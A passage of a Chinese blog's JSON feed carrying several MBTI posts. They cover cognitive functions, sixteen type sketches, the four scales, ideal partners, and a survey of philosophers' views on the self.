是历时性的，方向朝向过去，是对过去现象的采集与积累</p>\n</li>\n<li>\n<p>体现为个人经验、社会传统、规范准则等，是现实的、经验性的、接地气的和完全隶属过去的，与凌空对于未来的构想 Ni 形成鲜明对比。</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Se 外倾感觉</li>\n</ol>\n<ul>\n<li>\n<p>Se 与 Ne 同属当下，位于同一维度的不同位置。</p>\n</li>\n<li>\n<p>Se 是对当前场景内切实可感到的一切信息的收集，是耳闻目见的事实的采集，与 Ne 的联想和想象形成对比。</p>\n</li>\n</ul>\n<h3 id=\"fi与fe\"><a class=\"markdownIt-Anchor\" href=\"#fi与fe\">#</a> Fi 与 Fe</h3>\n<ol>\n<li>Fi 内倾情感</li>\n</ol>\n<ul>\n<li>\n<p>Fi 以满足内在情感为动力，Fe 以满足外在情感为动力。</p>\n</li>\n<li>\n<p>将情感比作一股流水，Fi 的情感流流向自我，流向内在，成为被输入方；</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Fe 外倾情感</li>\n</ol>\n<ul>\n<li>Fe 则相反，情感流流向他人，流向外在，成为输出方。</li>\n</ul>\n<h3 id=\"ti与te\"><a class=\"markdownIt-Anchor\" href=\"#ti与te\">#</a> Ti 与 Te</h3>\n<ol>\n<li>Ti 内倾思考</li>\n</ol>\n<ul>\n<li>\n<p>Ti 以自身内在逻辑为标准</p>\n</li>\n<li>\n<p>可视作一个人内在的世界观与小宇宙的法则，完全个人化的逻辑建构</p>\n</li>\n</ul>\n<ol>\n<li>Te 外倾思考</li>\n</ol>\n<ul>\n<li>\n<p>Te 以外在客观逻辑为标准</p>\n</li>\n<li>\n<p>更贴近众所周知的因果律、形式逻辑、公理。</p>\n</li>\n</ul>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%8D%81%E5%85%AD%E5%9E%8B%E4%BA%BA%E6%A0%BC/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%8D%81%E5%85%AD%E5%9E%8B%E4%BA%BA%E6%A0%BC/",
            "title": "十六型人格",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<h2 id=\"sj-秩序守卫者\"><a class=\"markdownIt-Anchor\" href=\"#sj-秩序守卫者\">#</a> SJ - 秩序守卫者</h2>\n<p>SJ 人格的核心词汇就是 “教条”。他们是规则的拥戴者，生活的大事小情都在围绕着自己内心认定的准则进行，有时显得十分固执。</p>\n<h3 id=\"estj\"><a class=\"markdownIt-Anchor\" href=\"#estj\">#</a> ESTJ</h3>\n<p>霸道总裁，日常管理，雷厉风行，作风强悍，精力旺盛，粗犷豪迈，声如洪钟。刺头，干涉主义，人缘不大好，治安重点。抠门，或曰俭朴。没理也要压你一头。</p>\n<p>ESTJ 对身边的事物充满控制欲，希望对人和事都有一种绝对的驾驭，不希望别人违背他们的命令</p>\n<h3 id=\"istj\"><a class=\"markdownIt-Anchor\" href=\"#istj\">#</a> ISTJ</h3>\n<p>公务员，官僚，大管家。沉稳老练，老成持重，个性中庸，极为自律。实用主义，循规蹈矩，追求形式，重视细节，完美主义。忠诚的执行者。</p>\n<p>ISTJ 的 “教条主义” 主要表现在生活的规规矩矩上，可以说 ISTJ 是最为世俗、最适合中国社会生存的人格之一。</p>\n<h3 id=\"esfj\"><a class=\"markdownIt-Anchor\" href=\"#esfj\">#</a> ESFJ</h3>\n<p>小市民，财迷。性格强势，崇敬权威，待人热情，控制欲强，圣母法西斯，得理不饶人。社会主力。暴脾气，急性子，撒泼能手，不计后果。直率或曰粗鲁。犹如欲望的火焰。亲妈系列。</p>\n<p>ESFJ 热情洋溢，喜欢照顾身边的人，但私底下小心翼翼，比较刻板。</p>\n<h3 id=\"isfj\"><a class=\"markdownIt-Anchor\" href=\"#isfj\">#</a> ISFJ</h3>\n<p>护卫者，医生，教师，传统，稳健，性格倔强，意志坚韧，责任心重。道德模范，传统保守，贤妻良母。抗压力强，苦度人生。苛求别人，有压迫感。</p>\n<p>ISFJ 内敛温和，善于倾听，是很好的伙伴，不过骨子里认可传统观念，也愿意向世俗规则低头。</p>\n<h2 id=\"sp-探索创造者\"><a class=\"markdownIt-Anchor\" href=\"#sp-探索创造者\">#</a> SP - 探索创造者</h2>\n<p>和 SJ 相比，SP 显得灵活多了，SP 人格总和 “玩乐”、“乐趣” 挂钩。他们乐于探索，喜于创造，也有表演天赋，多出现演员、艺术家。</p>\n<h3 id=\"esfp\"><a class=\"markdownIt-Anchor\" href=\"#esfp\">#</a> ESFP</h3>\n<p>模仿者，表演家，戏精。众人开心果，热心肠，活在别人的世界里。自己只是映衬他们。没有自我，我是谁？不知道。热爱生活，开心每一天。长舌，话匣子，既暖又渣。</p>\n<p>他们在生活里喜欢玩乐，和玩沾边的事基本都不会拒绝，也拥有探索精神。</p>\n<h3 id=\"isfp\"><a class=\"markdownIt-Anchor\" href=\"#isfp\">#</a> ISFP</h3>\n<p>服务员，小家碧玉，文艺青年，即时享乐，胆小心眼小，心细如发，性格软弱，逆来顺受。不自信，低看自己。</p>\n<p>ISFP 内敛，富有艺术灵感，他们的 “探索家” 气质主要展现在艺术方面的深度探索，而不是横向探索。ISFP 也是一种敏感细腻的人格，经常能做出深入人心的作品。</p>\n<h3 id=\"estp\"><a class=\"markdownIt-Anchor\" href=\"#estp\">#</a> ESTP</h3>\n<p>生意人，冒险家，赌徒，一心挣大钱。光鲜靓丽形象上佳，绿茶，个性前卫开放，待人热情，春光满面，口是心非。目的性强，道德感较低。不是老实人。江湖游侠，快意恩仇。</p>\n<p>ESTP 和 ESFP 相比更油滑一点，更老道一点，也更有自己的主见和思想。</p>\n<h3 id=\"istp\"><a class=\"markdownIt-Anchor\" href=\"#istp\">#</a> ISTP</h3>\n<p>工匠，手艺人，乐手，网络极客。心灵手巧，思维敏捷，擅长创造。冒险家，自我中心的功利主义者，活在当下，没有纵深，冷酷而勤奋。</p>\n<p>ISTP 和 ISFP 的共同之处是纵向探索，不过 ISTP 没有那么高的艺术天赋，他们的天赋主要展现在技艺、运动方面。</p>\n<h2 id=\"nt-坚定理性者\"><a class=\"markdownIt-Anchor\" href=\"#nt-坚定理性者\">#</a> NT - 坚定理性者</h2>\n<p>NT 人格的特点主要表现在 “稳”。什么是理智者？就是万事从理智出发，不被外界因素所干扰，即使是看起来很不靠谱的 ENTP，骨子里也是如此。</p>\n<h3 id=\"entj\"><a class=\"markdownIt-Anchor\" href=\"#entj\">#</a> ENTJ</h3>\n<p>指挥者，战略家，组织核心，领导力强，雄图大略，野心勃勃。杀伐决断，冷酷无情。不怒而威，富有个人魅力。外热内冷，犹如太阳当空，光芒四射。道德感存疑或较低。看谁都是工具。</p>\n<p>ENTJ 充满野心不说，在利益面前从不被感情动摇，这使得他们很少有在事业上没有作为的。</p>\n<h3 id=\"intj\"><a class=\"markdownIt-Anchor\" href=\"#intj\">#</a> INTJ</h3>\n<p>权谋家，腹黑，孤独冷漠，为理念而战，目标如一。精于谋略，阴谋，城府深，大格局，行事果断狠辣，幕后 BOSS，黑洞般的存在。意见领袖，刚愎自用，一意孤行，没有朋友。</p>\n<p>INTJ 之所以排在 ENTJ 后面主要因为太闷骚了，没错，就是闷骚，明明是个逗比却要装高冷，让大家都感觉他很难接近的样子，这不是闷骚是什么。不过 INTJ 平时做事还是很冷静的。</p>\n<h3 id=\"entp\"><a class=\"markdownIt-Anchor\" href=\"#entp\">#</a> ENTP</h3>\n<p>谈判家，外交家，有韬略。演讲能力强，脑洞专家，点子极多，幽默风趣，话中带刺，天生的批判家，不沉稳，性格急，容易跳，夸夸其谈，眼高手低。</p>\n<p>ENTP 的嘻嘻哈哈只是表面，内在的深入思考可以和 ENTJ 媲美。</p>\n<h3 id=\"intp\"><a class=\"markdownIt-Anchor\" href=\"#intp\">#</a> INTP</h3>\n<p>思想家 理论家，码农，务虚，兴趣广泛，生活在抽象的概念世界里，随遇而安，以概念探索为乐。没有城府，懒人，拖延症。傲娇受。</p>\n<p>INTP 逻辑出奇，很少有人能理解他们的脑洞，但这不代表他们不理智呀。</p>\n<h2 id=\"nf-理想主义者\"><a class=\"markdownIt-Anchor\" href=\"#nf-理想主义者\">#</a> NF - 理想主义者</h2>\n<p>理想主义者，那就是矫情鬼啊，要我说 NF 是 16 型人格里最固执的，也最不容易变成其他人格，因为完美癖这种东西，一旦沾上整个人就完了。</p>\n<h3 id=\"enfj\"><a class=\"markdownIt-Anchor\" href=\"#enfj\">#</a> ENFJ</h3>\n<p>布道者，教育家，精神领袖。组织核心，公关专家，亲和力强，人脉广泛，人缘好。积极的社会活动家。贤良淑德，大家闺秀，重视修身。佛法无边，阿弥陀佛。</p>\n<p>ENFJ 算是 NF 里最不 NF 的，为啥呢，因为他们对 “不完美” 的包容度稍微有那么一点点，所以 ENFJ 比较入世，比较能和 NT，和 S 厮混到一起。</p>\n<h3 id=\"infj\"><a class=\"markdownIt-Anchor\" href=\"#infj\">#</a> INFJ</h3>\n<p>间谍，伪装者，内心柔软，仁慈博爱，理念稳固，行动果敢。卑弱而强势，曲意逢迎，宫于心计，善于伪装，层层设防。大龄剩女。</p>\n<p>INFJ 是有自知之明，我知道自己完美主义，我来买单。</p>\n<h3 id=\"enfp\"><a class=\"markdownIt-Anchor\" href=\"#enfp\">#</a> ENFP</h3>\n<p>心灵捕手，煽动家，宣传家，政宣骨干，传销头目。主持人，大忽悠，能用概念把群众忽悠得团团转。朋友多，关系广，三分钟热度，喜新厌旧，中央空调。</p>\n<p>ENFP 和 INFP 都是特别固执特别偏执的，对自己心中坚持的完美不肯退让的那种，然而他们自己可能还没发现，来一出死不承认（尤其是 INFP）。</p>\n<h3 id=\"infp\"><a class=\"markdownIt-Anchor\" href=\"#infp\">#</a> INFP</h3>\n<p>编剧，文艺青年，道德内建，精神世界丰富，重度中二。懦弱，被动，受气包，娘炮，被算计的理想对象。特别固执特别偏执。</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%9B%9B%E4%B8%AA%E5%AD%90%E9%87%8F%E8%A1%A8/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E5%9B%9B%E4%B8%AA%E5%AD%90%E9%87%8F%E8%A1%A8/",
            "title": "四个子量表",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<h2 id=\"外倾内倾-能量更集中地指向\"><a class=\"markdownIt-Anchor\" href=\"#外倾内倾-能量更集中地指向\">#</a> 外倾 — 内倾 （能量更集中地指向）</h2>\n<p>E: 外向即交往是人的本质，孤独是种折磨，说话是常态。交往让他获取能量，愈加兴奋。<br>\nI: 内向即使内心归于平静才是人的追求，孤独是种享受，沉默是常态。交往让他耗费能量，愈加交瘁。</p>\n<h3 id=\"e\"><a class=\"markdownIt-Anchor\" href=\"#e\">#</a> E</h3>\n<p>与他人相处精力充沛</p>\n<p>希望成为注意的焦点</p>\n<p>行动，之后思考</p>\n<p>喜欢边想边说出声</p>\n<p>易于 “读” 和了解；随意地分享个人信息</p>\n<p>说的比听的多</p>\n<p>高度热情地社交</p>\n<p>反应快，喜欢快节奏</p>\n<p>重于广度而不是深度</p>\n<h3 id=\"i\"><a class=\"markdownIt-Anchor\" href=\"#i\">#</a> I</h3>\n<p>独自度过时光精力充沛</p>\n<p>避免成为注意的焦点</p>\n<p>思考，之后行动</p>\n<p>在心中思考问题不善于表露</p>\n<p>相对封闭，更愿意在经挑选的小群体中分享个人的信息</p>\n<p>听的比说的多</p>\n<p>不把热情表现出来</p>\n<p>仔细考虑后，才有所反应，喜欢慢节奏</p>\n<p>喜欢深度而不是广度</p>\n<h2 id=\"感觉直觉收集信息的方式\"><a class=\"markdownIt-Anchor\" href=\"#感觉直觉收集信息的方式\">#</a> 感觉 — 直觉（收集信息的方式）</h2>\n<p>S: 务实即现实，功利，活在当下，感官享乐。更善于运用自己的身体。权威就是道理。</p>\n<p>N: 务虚即理想，精神，概念世界，精神享乐。更善于运用自己的头脑。道理是道理，权威是权威。</p>\n<h3 id=\"s\"><a class=\"markdownIt-Anchor\" href=\"#s\">#</a> S</h3>\n<p>相信确定和有型的事物</p>\n<p>喜欢新想法 — 它们必须有实际意义</p>\n<p>重视现实性和常识性</p>\n<p>喜欢使用和琢磨已知的技能</p>\n<p>留心具体的和特殊的；进行细节描述</p>\n<p>循序渐进地讲述有关情况</p>\n<p>着眼于现实或现在</p>\n<h3 id=\"n\"><a class=\"markdownIt-Anchor\" href=\"#n\">#</a> N</h3>\n<p>相信灵感和推断</p>\n<p>喜欢新思想和概念必须符合自己的意愿</p>\n<p>重视想象力和独创力</p>\n<p>喜欢学习新技能，但掌握之后很容易就厌倦了</p>\n<p>留心普遍的和有象征性的；使用隐喻和类比</p>\n<p>跳跃性地展现事实以一种绕圈子的方式</p>\n<p>着眼于未来</p>\n<h2 id=\"思维情感做决定的方式\"><a class=\"markdownIt-Anchor\" href=\"#思维情感做决定的方式\">#</a> 思维 — 情感（做决定的方式）</h2>\n<p>T: 理性客观重理，即逻辑严密，规则冰冷。世界是天行有常，不为尧存，不为桀亡。人为工具。</p>\n<p>F: 感性主观重情，即强调沟通，重视情感纽带，世界以人为本。</p>\n<h3 id=\"t\"><a class=\"markdownIt-Anchor\" href=\"#t\">#</a> T</h3>\n<p>退后一步思考，对问题进行客观的分析</p>\n<p>重视符合逻辑、公正、公平的价值；一视同仁</p>\n<p>容易发现缺点，有吹毛求疵的倾向，倾向于批评</p>\n<p>被认为冷酷、麻木、漠不关心</p>\n<p>认为圆通比坦率更重要</p>\n<p>只有情感符合逻辑时，才是正确的，才可取</p>\n<p>渴望成就而激励</p>\n<h3 id=\"f\"><a class=\"markdownIt-Anchor\" href=\"#f\">#</a> F</h3>\n<p>超前思考，考虑行为对他人的影响</p>\n<p>重视同情与和睦：重视准则的例外性</p>\n<p>给人快乐，容易理解别人</p>\n<p>被认为感情过多，缺少逻辑性，软弱</p>\n<p>认为圆通与坦率同样重要</p>\n<p>无论是否有意义，认为任何感情都可取</p>\n<p>为了获得欣赏而激励</p>\n<h2 id=\"判断知觉感到舒适的生活方式\"><a class=\"markdownIt-Anchor\" href=\"#判断知觉感到舒适的生活方式\">#</a> 判断 — 知觉（感到舒适的生活方式）</h2>\n<p>J: 秩序即掌控，消灭不确定性，重视规则，规避风险，律己律人。总有一条路最可靠。</p>\n<p>P: 自由即随性，随遇而安，冒险开放，未来不止有一条路可走。</p>\n<h3 id=\"j\"><a class=\"markdownIt-Anchor\" href=\"#j\">#</a> J</h3>\n<p>做了决定后感到快乐</p>\n<p>有 “工作原则”：先工作再玩（如果有时间的话）</p>\n<p>建立目标，并准时地完成</p>\n<p>愿意知道它们将面对的情况</p>\n<p>着重结果 (重点在于完成任务)</p>\n<p>满足感来源于完成计划</p>\n<p>把时间看作有限的资源，认真地对待最后期限</p>\n<h3 id=\"p\"><a class=\"markdownIt-Anchor\" href=\"#p\">#</a> P</h3>\n<p>当各种选择都存在时，感到快乐</p>\n<p>“玩的原则”：先玩再完成工作 (如果有时间的话)</p>\n<p>随着新信息的获取，不断改变目标</p>\n<p>喜欢适应新情况</p>\n<p>着重过程 (重点在于如何完成工作)</p>\n<p>满足感来源于计划的开始</p>\n<p>认为时间是可更新的资源，而最后期限也是有收缩的</p>\n<h2 id=\"第四个字母jp\"><a class=\"markdownIt-Anchor\" href=\"#第四个字母jp\">#</a> 第四个字母 J/P</h2>\n<p>第四个字母的 J / P 是最复杂的，J / P 是 Judging / Perceiving 的首字母。它的含义是，从外界（他人的视角）来看你，你是一个经常处于「J 判断」状态的人，还是一个「P 感知」状态的人。具体来说，这个字母看的是你强功能里外倾（Xe）的那个功能的类别：</p>\n<p>如果强功能中有 Te 或 Fe —— xxxJ -   如：INTJ（Ni Te），ENFJ（Fe Ni）<br>\n如果强功能中有 Ne 或 Se —— xxxP -   如：INTP（Ti Ne），ENFP（Ne Fi）</p>\n<p>从表象上来说，J 类型的人外界（对人、对事）的控制和操纵欲比较强，而 P 类型的人比较随遇而安。这个 J / P 的维度，其实也是我觉得很有意思的一个维度。它考量的是从「外部视角」看到的你，并不等同与你实际的最优先采用的认知模式。</p>\n<p>比如 INTP（Ti Ne）虽然从外部看来是 Perceiver（辅助位 Ne），但实际本质上是 Judger（主导位 Ti）。他们确实给人感觉很开放随和，看起来不 judge 的样子。但其实在他们的内心是自有一套明确的判断标准的，他们只是不常输出（或者觉得没必要输出）他们的判断结果罢了。</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E7%90%86%E6%83%B3%E5%8F%A6%E4%B8%80%E5%8D%8A/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E7%90%86%E6%83%B3%E5%8F%A6%E4%B8%80%E5%8D%8A/",
            "title": "理想另一半",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<h2 id=\"sj\"><a class=\"markdownIt-Anchor\" href=\"#sj\">#</a> SJ</h2>\n<h3 id=\"estj\"><a class=\"markdownIt-Anchor\" href=\"#estj\">#</a> ESTJ</h3>\n<p>希望对方能幽默有趣，如果能搞笑一些再好不过了。</p>\n<p>有担当，做出的承诺一定会履行。大多时候都会听我的，愿意在我面前服软认输。</p>\n<h3 id=\"istj\"><a class=\"markdownIt-Anchor\" href=\"#istj\">#</a> ISTJ</h3>\n<p>规划人生，一起进步，在一些细节里体现出爱意。</p>\n<p>但可能不会用直接或者强烈的语言肢体表达。</p>\n<h3 id=\"esfj\"><a class=\"markdownIt-Anchor\" href=\"#esfj\">#</a> ESFJ</h3>\n<p>爱情比较传统，渴望踏实平稳的爱情生活，希望双方都是有规划有共同目标的。</p>\n<p>刚开始会短暂的浪漫和激情，接下来就会很快进入一种平淡的节奏。</p>\n<p>伴侣的感觉就像是温柔的臂弯，是最大的依靠吧，专注于每天的一点点小事，就很觉得很踏实很幸福了。</p>\n<h3 id=\"isfj\"><a class=\"markdownIt-Anchor\" href=\"#isfj\">#</a> ISFJ</h3>\n<p>喜欢自信阳光，比较理性的人，两个人可以一起成长，在各自擅长的领域发光发热，互相欣赏互相尊重。</p>\n<p>可以一起玩，但也给彼此留有一定的独处时间。</p>\n<p>会比较向往以结婚组建家庭为导向的，门当户对父母都认可的那种爱情。</p>\n<h2 id=\"sp\"><a class=\"markdownIt-Anchor\" href=\"#sp\">#</a> SP</h2>\n<h3 id=\"esfp\"><a class=\"markdownIt-Anchor\" href=\"#esfp\">#</a> ESFP</h3>\n<p>真爱至上。会在爱情中表达自己当下炙热的感受，会热情表达对对方的喜爱之情，会体贴细致地为对方着想。</p>\n<p>希望感情中会出现 “我在闹 ta 在笑” 这样的感觉。</p>\n<h3 id=\"isfp\"><a class=\"markdownIt-Anchor\" href=\"#isfp\">#</a> ISFP</h3>\n<p>喜欢动物和大自然，希望 ta 是温柔且细心的人，能陪我一起安静地躺在草坪上看星星。</p>\n<p>在意我的感受，愿意去我的世界了解我，呵护我。</p>\n<h3 id=\"estp\"><a class=\"markdownIt-Anchor\" href=\"#estp\">#</a> ESTP</h3>\n<p>能够接受柏拉图式恋爱，但是自己没办法做到，在我这里爱和性是分不开的。</p>\n<p>两个人谈恋爱其实也是一种博弈，要一起往前走一起进步，否则再深厚的感情都会因为一方的停滞不前被消磨殆尽。</p>\n<h3 id=\"istp\"><a class=\"markdownIt-Anchor\" href=\"#istp\">#</a> ISTP</h3>\n<p>希望 ta 独立强大，有自己的梦想，而且能够包容我的性格和缺点。</p>\n<p>必要时一定要给彼此适当的个人空间。</p>\n<h2 id=\"nt\"><a class=\"markdownIt-Anchor\" href=\"#nt\">#</a> NT</h2>\n<h3 id=\"entj\"><a class=\"markdownIt-Anchor\" href=\"#entj\">#</a> ENTJ</h3>\n<p>绝对的尊重，适度的建议，无声的陪伴，经常的惊喜，十分的浪漫，偶尔的示爱。</p>\n<h3 id=\"intj\"><a class=\"markdownIt-Anchor\" href=\"#intj\">#</a> INTJ</h3>\n<p>我只喜欢比我强的人。</p>\n<h3 id=\"entp\"><a class=\"markdownIt-Anchor\" href=\"#entp\">#</a> ENTP</h3>\n<p>不关乎其他，灵魂上的共鸣胜过一切。</p>\n<h3 id=\"intp\"><a class=\"markdownIt-Anchor\" href=\"#intp\">#</a> INTP</h3>\n<p>精神层次大于物质大于肉体，对方需要有独立思考的能力和渊博的知识，需要可以带领我帮助我的那种。</p>\n<p>在外界可以表现的孤僻些，但是内心强大不 emo。</p>\n<p>最好有相同的音乐品味以及审美，文笔好的话很加分。物质基础需要有享受生活的机会。</p>\n<h2 id=\"nf\"><a class=\"markdownIt-Anchor\" href=\"#nf\">#</a> NF</h2>\n<h3 id=\"enfj\"><a class=\"markdownIt-Anchor\" href=\"#enfj\">#</a> ENFJ</h3>\n<p>希望 ta 性格有趣，开朗优秀，有闪光点，是会让我发自内心敬佩的人。</p>\n<p>能适当的放养自己，给我足够的自由空间，依赖我，包容我。</p>\n<h3 id=\"infj\"><a class=\"markdownIt-Anchor\" href=\"#infj\">#</a> INFJ</h3>\n<p>性格温和，三观相近、善于沟通和表达自我感受很重要，我希望我能看懂并理解 ta 的基础上，还能喜欢 ta。</p>\n<p>相比于喜欢优点我更关注彼此对缺点的包容程度。爱好可以截然不同，但是可以求同存异，会愿意走进我的世界了解我。</p>\n<p>真诚和信任，是唯一能打动 “我” 的品质。</p>\n<h3 id=\"enfp\"><a class=\"markdownIt-Anchor\" href=\"#enfp\">#</a> ENFP</h3>\n<p>足够坦诚，足够真诚，互相鼓励，共同前行，愿意和我一起经历所有的曲折和坎坷，完全的坚定的支持我。</p>\n<h3 id=\"infp\"><a class=\"markdownIt-Anchor\" href=\"#infp\">#</a> INFP</h3>\n<p>想找灵魂伴侣，互相治愈成长。爱人大概等同于好朋友中的好朋友，先成为我的朋友才有可能成为我的恋人。</p>\n<p>能吃到一起，聊到一起，玩到一起，在遇到困难的时候能够互相支持说‘我在’的人。</p>\n",
            "tags": [
                "MBTI"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2020/04/01/MBTI/%E8%87%AA%E6%88%91%E4%B8%8E%E5%8A%A8%E6%9C%BA/",
            "url": "http://www.n1h1l157.live/2020/04/01/MBTI/%E8%87%AA%E6%88%91%E4%B8%8E%E5%8A%A8%E6%9C%BA/",
            "title": "自我与动机",
            "date_published": "2020-03-31T16:00:00.000Z",
            "content_html": "<p>对完美的要求越来越高，控制欲，焦虑感也不断生发。时间久了就会产生精神问题。所以很多完美主义者，到了后期，会变得异常敏感，焦虑，睡眠不足。控制欲变得特别强烈。</p>\n<h2 id=\"什么是自我\"><a class=\"markdownIt-Anchor\" href=\"#什么是自我\">#</a> 什么是 &quot;自我&quot;</h2>\n<p>自我是如何诞生的？我们做事的动机又是什么？</p>\n<h3 id=\"诞生\"><a class=\"markdownIt-Anchor\" href=\"#诞生\">#</a> 诞生</h3>\n<p>任何一种思想，一定有一个源头，而泰勒斯就是 “事物究竟是什么构成” 这种思想的源头。有人问泰勒斯 “何事最为难”，泰勒斯应道：“认识你自己”。</p>\n<p>毕达哥拉斯提出了灵魂论，开创了灵魂轮回说。他是第一个把人类意识实体化的思想家。给之后的笛卡尔的 “身心二元论”，打下了基础。</p>\n<p>赫拉克利特说过一句话 “我研究了我自己”。赫拉克利特是第一个区分 “理性思维” 和 “感性思维” 的思想家，他认为理性就是为了辅助人们寻求事物的发展规律，能更好的适应环境。他认为世界的一切都遵循着某种规律。</p>\n<p>苏格拉底认为人要做自己，但做自己之前得认清自己，他那句著名 “认清你自己”。成为了往后直至现在思想界的至理名言。他认为，一个人如果连自己是个什么样子都弄不明白，他不可能弄明白这个世界。会一辈子浑浑噩噩。</p>\n<h3 id=\"柏拉图\"><a class=\"markdownIt-Anchor\" href=\"#柏拉图\">#</a> 柏拉图</h3>\n<p>人类的知识是与生俱来的。学习只是将原本埋藏在灵魂深层的理念发掘出来。人类不可能真正认识事物。认识事物的过程是一种人类自身理念的投射过程。</p>\n<p>最幸福的的人生，就是做一份自己喜欢的工作。是建立在对 “自我” 深度认识之后，了解自己适合干什么，不适合干什么，对什么感兴趣等一系列问题后，得出的结论。</p>\n<h3 id=\"亚里士多德\"><a class=\"markdownIt-Anchor\" href=\"#亚里士多德\">#</a> 亚里士多德</h3>\n<p>人类和一般动物的区别就在于人类拥有 “理性”。人类应该用自己的理性去创造幸福。而不是单纯依靠直觉。只有理性才能带来幸福，和认清自我。</p>\n<p>所有的美德都来自于达成 “过度” 与 “贫乏” 之间的平衡点。勇气是恐惧和自信之间的平衡点。找到事物的平衡点就找到了幸福的关键。这也正是 “自我” 以何种形式呈现的关键。</p>\n<h3 id=\"柏拉图-2\"><a class=\"markdownIt-Anchor\" href=\"#柏拉图-2\">#</a> 柏拉图</h3>\n<p>事物是不断变化的，但不变的是人类对事物的观念，也就是理型。</p>\n<p>人在脑中建构了一套认识事物的模型，用这些模型去认识事物。比如 “概念”“命题” 是建立在这种理型之上的产物。</p>\n<h3 id=\"伊壁鸠鲁\"><a class=\"markdownIt-Anchor\" href=\"#伊壁鸠鲁\">#</a> 伊壁鸠鲁</h3>\n<p>肉体快乐是被动的，而精神的快乐才可以自由支配。欲望必须节制，平和的心境帮人忍受痛苦。</p>\n<p>惧怕死亡是不理智的。只要我们存在一天，死亡就不会来临。而死亡来了，我们也就不在了。</p>\n<h3 id=\"叔本华\"><a class=\"markdownIt-Anchor\" href=\"#叔本华\">#</a> 叔本华</h3>\n<p>意志是独立于时间和空间的，它同时亦包括所有的理性与知识，我们只能透过沉思来摆脱它。认为被意志所支配最终只会带来虚无和痛苦。</p>\n<p>世界分为两个部分，一方面是表象，一方面是意志。主体是认识一切而不被任何事物所认识的。我们每个人正是这样一个主体。而客体是我们通过先验的时空范畴去认识事物。主体和客体共同构成了表象世界，是不可分的。</p>\n<p>很多表面上的道德行为都是出于利己的目的而做的，其中最重要的两个原因是个人名誉和法律规范。</p>\n<p>出于个人名誉的道德行为其目的的隐含着满足自己的意欲，希望自己获得他人的敬意从而产生心理上的满足。而迫于法律规范的道德行为则是为了规避法律的惩罚，免于自己受到损失而做出的。</p>\n<h3 id=\"卢梭\"><a class=\"markdownIt-Anchor\" href=\"#卢梭\">#</a> 卢梭</h3>\n<p>“人们不会对比自己幸福的人产生好感，而只会对比我们不幸福的人感同身受，也就是将众生与自己视为一体。”</p>\n<p>人对他人的同情实质是将众生视为了自己，不过是一种自怜，然而从同情出发，直到高尚无私，慷慨大方，都是出自于对自我的怜悯。</p>\n<p>几乎可以理解为，一个人有多么慷慨，他在内心就觉得自己有多值得同情。</p>\n<h3 id=\"尼采\"><a class=\"markdownIt-Anchor\" href=\"#尼采\">#</a> 尼采</h3>\n<p>“我们不可避免跟自己保持陌生，我们不明白自己，我们搞不清楚自己，我们的永恒判词是：离每个人最远的，就是他自己。”</p>\n<p>人对这世界的了解总是主观的，并且受制于自我认知的局限，所以很难彻底的看清楚自己的全貌，此过程受太多因素的影响。</p>\n<h3 id=\"佛洛依德\"><a class=\"markdownIt-Anchor\" href=\"#佛洛依德\">#</a> 佛洛依德</h3>\n<p>用 “压抑” 这个词来形容内在需求被抑制。但他认为，被抑制的情绪不会消失，而是会用另外一种方式呈现出来，比如梦境。</p>\n<p>提出了著名的 “性本能”。简单来说就是，人的行为包括身体行为和心理行为其原动力都是 “性”。他把那种由性催发出来的动能叫做 “力比多”。</p>\n<p>本我 =” 原始的我 “，最真实的我。原始欲望的我。非道德的我。超我 =” 社会的我 “，根据社会需求重塑的 “我”。也就是遵循社会道德规范的” 我 “。</p>\n<p>自我 = 平衡” 原始的我 “和” 社会的我 “。 比如说，一个人在道德观念中极度压抑，这个时候，自我就出来劝说了。</p>\n<p>如果超我过了头，就会产生压抑，如果本我过了头就会产生问题。需要自我来平衡。佛洛依德从临床观察得到结论，大部分的精神问题都源于压抑。</p>\n<p>自我则在本超二我之间努力调和，使一个人在既能满足自己一定需求的情况下，又不为社会道德所指责，且努力向理想进发。</p>\n<h3 id=\"罗洛梅\"><a class=\"markdownIt-Anchor\" href=\"#罗洛梅\">#</a> 罗洛梅</h3>\n<p>现代人大部分的心理问题。都源于压抑真实的需求。需求得不到满足。一般会出现两种情况。</p>\n<p>1. 压抑，压抑自己的欲望和需求，让自己和客观情况处于一种平衡状态。比如我们现在说的 “躺平”。</p>\n<p>2. 强行把自己分裂出另外一个种人格来满足自我的需求。比如，你原本是一个胆小，敏感的人，感性的人，热情的人。那么为了得到名利，地位。而把自己分裂出一种，勇敢，理性，冷漠的人。</p>\n<p>相对第一种情况而言，第二种就不那么健康了。因为，一个人的性格很大程度上是不可改变的，如果强行改变，就必须付出代价。</p>\n<h3 id=\"荣格\"><a class=\"markdownIt-Anchor\" href=\"#荣格\">#</a> 荣格</h3>\n<p>认为梦反应了潜意识，但与佛洛依德最大的分别是，佛洛依德认为梦是压抑得到释放的结果，但荣格强调梦更多的是一种补偿作用。</p>\n<p>潜意识：是指人类心理活动中，不能认知或没有认知到的部分，是人们 “已经发生但并未达到意识状态的心理活动过程”。</p>\n<p>集体潜意识：指人类祖先进化过程中，集体经验心灵底层的精神沉积物，处于人类精神的最低层，为人类所普遍拥有。在个体一生中从未被意识到，经由遗传获得来。由全部本能及其相关的原型组成。</p>\n<p>人格面具使人能够演绎各种性格，通常为了符合社会期待的一面，给与他人留下一个好印象。另外一方面，人格面具也作为隐藏真实自我的一种工具。</p>\n<p>荣格也从正面肯定了 “人格面具” 的必要性，他认为人格面具对于人在社会上生存是必须的，它能够让人适应社会的环境。他认为，人在不同的环境会自动切换成不同的面具。这一过程很多时候是不自知的。所以是在潜意识下进行的。</p>\n<h3 id=\"一些名词\"><a class=\"markdownIt-Anchor\" 